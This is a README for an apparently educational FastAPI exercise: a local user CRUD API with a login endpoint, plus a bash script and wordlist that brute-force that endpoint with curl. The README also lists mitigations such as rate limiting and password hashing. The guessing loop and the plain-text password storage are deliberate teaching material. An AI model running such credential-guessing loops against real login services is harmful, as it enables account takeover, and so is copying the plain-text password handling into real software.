<!-- START README -->

# Users CRUD + Controlled Brute-Force (FastAPI)

> **Educational use only.** All tests must be run **only** against this **local** API and with **practice accounts** created for the exercise.

## Requirements
- Python 3.10+
- (Windows) Git Bash or WSL to run `brute.sh`

## Setup

```bash
# In the project folder
py -m venv .venv
.\.venv\Scripts\Activate.ps1
py -m pip install --upgrade pip
py -m pip install -r requirements.txt
```

## Run the API

```bash
py -m uvicorn main:app --reload
```

- Swagger UI: http://127.0.0.1:8000/docs  
- ReDoc:       http://127.0.0.1:8000/redoc

> **Note:** The “database” is **in-memory**. If the server reloads (e.g., due to `--reload`), users are cleared and must be created again.

---

## Endpoints

- `POST /users` — create user (receives **plain-text password**)
- `GET /users` — list users (passwords not returned)
- `GET /users/{id}` — get user by id
- `PUT /users/{id}` — update (everything **except** password)
- `DELETE /users/{id}` — delete
- `POST /login` — authenticate (returns only `login successful` or `Invalid credentials`)

### Quick CRUD test (in `/docs`)

**1) POST /users**
```json
{
  "username": "demo",
  "password": "pass123",
  "email": "demo@mail.com",
  "is_active": true
}
```

**2) GET /users**  
**3) GET /users/1**

**4) PUT /users/1**
```json
{
  "email": "new@mail.com",
  "is_active": false
}
```

**5) Username conflict demo**  
Create user `admin`, then:
```json
{ "username": "admin" }
```
on `PUT /users/1` → should respond `username ya existe`.

**6) POST /login**
```json
{
  "username": "demo",
  "password": "pass123"
}
```

---

## Controlled brute-force (bash)

File: **`brute.sh`** (included). Run in **Git Bash** while the API is running:

```bash
chmod +x brute.sh
./brute.sh
```

By default it targets `USER="demo"` using a short internal wordlist.  
You can switch the user or read from a file:

### Using a `wordlist.txt`

**1) Create a simple wordlist**
```bash
cat > wordlist.txt <<'EOF'
123456
123456789
password
qwerty
abc123
admin
admin123
contraseña
contrasena
hola123
secret
pass123
EOF
```

**2) (Optional) Adjust `brute.sh` to read the file**  
Replace the loop with:
```bash
attempts=0
start=$(date +%s)

while IFS= read -r pwd; do
  attempts=$((attempts+1))
  resp=$(curl -s -X POST "$API" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
  echo "[$attempts] '$pwd' -> $resp"
  if [[ "$resp" == *"login successful"* ]]; then
    end=$(date +%s)
    echo "FOUND: '$pwd' in $attempts attempts, $((end-start))s"
    exit 0
  fi
  sleep 0.2
done < wordlist.txt

end=$(date +%s)
echo "NOT found after $attempts attempts in $((end-start))s"
exit 1
```

> Keep a small delay (e.g., `sleep 0.2`) so the test is **controlled** and you don’t overwhelm the local API.

### What to report (example)
- Target user: `admin`  
- Wordlist size: 12  
- Delay between attempts: 0.2 s  
- **Result**: found `secret` in 6 attempts, ~2 s  
- Conclusion: weak/common passwords are cracked very quickly.

---

## Mitigations (mention in your write-up)
- **Rate limiting** per IP/username
- **Backoff** after failed attempts (growing delays)
- **Strong password policy** (length/entropy)
- **Password hashing** (e.g., `bcrypt`) instead of plain text
- **CAPTCHA / MFA** to slow down automation

---

## Project structure
```
first-term-exam/
├─ main.py           # FastAPI (CRUD + login), in-memory "DB"
├─ brute.sh          # Bash brute-force script (controlled, uses curl)
├─ requirements.txt  # Dependencies
└─ README.md
```

### (Optional) .gitignore
```gitignore
.venv/
__pycache__/
*.pyc
*.log
.DS_Store
Thumbs.db
```

<!-- END README -->
